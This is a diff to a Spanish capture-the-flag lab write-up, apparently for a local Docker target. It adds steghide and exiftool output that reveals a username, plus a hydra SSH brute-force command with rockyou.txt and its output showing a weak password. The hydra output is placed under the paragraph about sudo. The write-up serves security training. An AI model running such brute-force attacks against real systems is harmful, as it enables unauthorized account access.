@@ -54,13 +54,49 @@ Descargamos la imagen en nuestro sistema de ataque y nos ponemos a investigarla.
 Hacemos un stego con `steghide` y obtenemos algo de información no importante.
 
 ```
+> steghide extract -sf imagen.jpeg
+Enter passphrase:
 
+wrote extracted data to "secreto.txt".
+
+> cat secreto.txt
+
+Sigue buscando, aquí no está to solución
+aunque te dejo una pista....
+sigue buscando en la imagen!!!
 ```
 
 Luego examinamos los metadatos de la imagen y conseguimos dar con un nombre de usuario.
 
 ```
+> exiftool imagen.jpeg
 
+ExifTool Version Number         : 12.76
+File Name                       : imagen.jpeg
+Directory                       : .
+File Size                       : 19 kB
+File Modification Date/Time     : 2024:10:07 21:32:57+02:00
+File Access Date/Time           : 2024:10:07 21:33:43+02:00
+File Inode Change Date/Time     : 2024:10:07 21:32:57+02:00
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+XMP Toolkit                     : Image::ExifTool 12.76
+Description                     : ---------- User: borazuwarah ----------
+Title                           : ---------- Password:  ----------
+Image Width                     : 455
+Image Height                    : 455
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 455x455
+Megapixels                      : 0.207
 ```
 
 Ahora, con el nombre de usuario podemos hacer fuerza bruta contra el servicio SSH con `hydra`.
@@ -76,7 +112,20 @@ Conseguimos acceder al sistema mediante SSH.
 Una vez dentro investigamos los comandos que podemos ejecutar con permisos `sudo`.
 
 ```
+> hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 06:48:07
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 06:48:12
 ```
 
 Nos encontramos que podemos ejecutar el binario`/bin/bash` con permisos ``sudo`` y sin contraseña.
